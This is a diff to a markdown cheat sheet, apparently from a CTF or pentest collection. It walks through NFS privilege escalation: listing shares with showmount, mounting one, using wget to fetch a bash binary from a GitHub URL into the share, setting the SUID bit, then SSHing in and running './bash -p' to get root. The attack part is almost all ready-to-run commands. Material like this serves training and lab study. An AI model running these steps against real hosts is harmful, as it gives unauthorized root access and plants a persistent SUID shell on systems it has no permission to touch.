@@ -11,34 +11,53 @@ NFS stands for "Network File System" and allows a system to share directories an
 7. SSH into the remote host (if SSH private key is found in the share)
 8. Run the executable on the remote host
 
+## Advance preparation
+```
+export rhost=[RHOST IP]
+```
+
 ## Enumeration (with NFS-Common)
 ### NFS-Common
 NFS-Common includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs.
 
 ### Listing NFS Shares
-showmount -e [IP]  
+```
+showmount -e $rhost  
+```
 
 ## Exploitation
 ### Create a mount point
-mkdir [MOUNT POINT]
+```
+mkdir /tmp/mount
+```
 
 ### Mounting NFS shares
-sudo mount -t nfs [IP]:[SHARE] [MOUNT POINT] -nolock
+```
+sudo mount -t nfs ${rhost}:[SHARE] /tmp/mount -nolock
+```
 
 - -t : Type of device to mount
-- IP : The IP Address of the NFS server
+- ${rhost} : The IP Address of the NFS server
 - SHARE	: The name of a share in the remote host
-- LOCAL DIR: The local directory to mount a share to
+- /tmp/mount: The local directory to mount a share to
 - -nolock	: Specifies not to use NLM locking
 
 ### Download or make a bash executable
-sudo wget https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash?raw=true -O [MOUNT POINT]/bash
+```
+sudo wget https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash?raw=true -O /tmp/mount/bash
+```
 
 ### Add the SUID bit and execution permission
-cd [MOUNT POINT] && sudo chmod +xs bash
+```
+cd /tmp/mount && sudo chmod +xs bash
+```
 
 ### SSH into the remote host
-ssh -i [PRIVATE KEY] [USERNAME]@[HOSTNAME]
+```
+ssh -i [PRIVATE KEY] [USERNAME]@${rhost}
+```
 
 ### Run the bash executable (with p persisting permission)
+```
 ./bash -p
+```
